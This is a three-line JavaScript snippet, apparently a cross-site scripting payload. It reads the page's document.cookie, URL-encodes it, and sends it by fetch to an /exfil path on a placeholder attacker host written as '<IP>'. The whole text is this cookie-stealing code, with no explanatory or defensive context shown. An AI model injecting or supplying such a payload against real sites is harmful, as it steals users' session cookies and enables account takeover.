let cookie = document.cookie

let encodedcookie = encodeURIComponent(cookie)

fetch("http://<IP>/exfil?data=" + encodedcookie)
